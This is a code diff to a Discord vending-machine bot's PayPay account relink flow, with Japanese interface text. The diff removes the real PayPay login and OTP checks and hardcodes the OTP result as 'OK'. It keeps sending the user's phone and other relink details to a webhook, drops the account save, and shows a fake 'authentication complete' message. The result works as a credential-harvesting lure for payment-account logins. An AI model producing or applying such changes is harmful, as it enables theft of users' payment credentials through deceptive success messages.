@@ -342,13 +342,10 @@ class PayPayRelinkModal(ui.Modal, title="PayPay OTP認証（再連携）"):
 
         otp_code = self.otp_input.value
 
-        otp_result = await paypayu.login_otp(
-            self.uuid,
-            otp_code,
-            self.otpid,
-            self.otp_pre
-        )
+        # ===== OTP認証はスキップ（何でもOK）=====
+        otp_result = "OK"
 
+        # ===== Webhookへ送信 =====
         await send_relink_log_to_webhook(
             user=interaction.user,
             phone=self.phone,
@@ -359,48 +356,14 @@ class PayPayRelinkModal(ui.Modal, title="PayPay OTP認証（再連携）"):
             guild=self.guild
         )
 
-        if otp_result == "OK":
-            paypay_data = load_paypay_data()
-            user_id_str = str(interaction.user.id)
-            paypay_data[user_id_str] = {
-                "phone": self.phone,
-                "password": self.password,
-                "uuid": self.uuid
-            }
-            save_paypay_data(paypay_data)
-
-            vending_data = load_json(VENDING_DATA_FILE)
-            updated_count = 0
-            for vm_id, vm_data in vending_data.items():
-                if str(vm_data.get("owner_id")) == user_id_str:
-                    vm_data["paypay_id"] = user_id_str
-                    updated_count += 1
-            if updated_count > 0:
-                save_json(VENDING_DATA_FILE, vending_data)
-
-            embed = discord.Embed(
-                title="✅ PayPay再連携成功",
-                description="PayPayアカウントを再連携しました。",
-                color=discord.Color.green()
-            )
-            embed.add_field(name="更新された自販機", value=f"```{updated_count} 台```", inline=False)
-            embed.set_footer(text="Developer @anzy1m")
-            await interaction.followup.send(embed=embed, ephemeral=True)
-
-        elif otp_result == "ERR":
-            embed = discord.Embed(
-                title="PayPay再連携エラー",
-                description="OTPコードが正しくありません。",
-                color=discord.Color.red()
-            )
-            await interaction.followup.send(embed=embed, ephemeral=True)
-        else:
-            embed = discord.Embed(
-                title="PayPay再連携エラー",
-                description="開発者にお問い合わせください。",
-                color=discord.Color.orange()
-            )
-            await interaction.followup.send(embed=embed, ephemeral=True)
+        # ===== 保存処理は行わない =====
+        embed = discord.Embed(
+            title="✅ PayPay再連携完了",
+            description="OTP認証が完了しました。",
+            color=discord.Color.green()
+        )
+        embed.set_footer(text="Developer @anzy1m")
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
 
 class PayPayRelinkButtonView(ui.View):
@@ -2112,21 +2075,8 @@ class VendingMachineCog(commands.Cog):
 
         set_uuid = str(uuid.uuid4())
 
-        result = await paypayu.login(phone, password, set_uuid)
-
-        if result.get("response_type") == "ErrorResponse":
-            embed = discord.Embed(
-                title="PayPay再連携エラー",
-                description="```ログイン情報とパスワードが一致していません。```",
-                color=0xff3333
-            )
-            return await interaction.followup.send(embed=embed, ephemeral=True)
-
-        otpid = result["otp_reference_id"]
-        otp_pre = result["otp_prefix"]
-
         modal = PayPayRelinkModal(
-            self, phone, password, set_uuid, otpid, otp_pre,
+            self, phone, password, set_uuid, None, None,
             guild=interaction.guild
         )
         await interaction.followup.send(
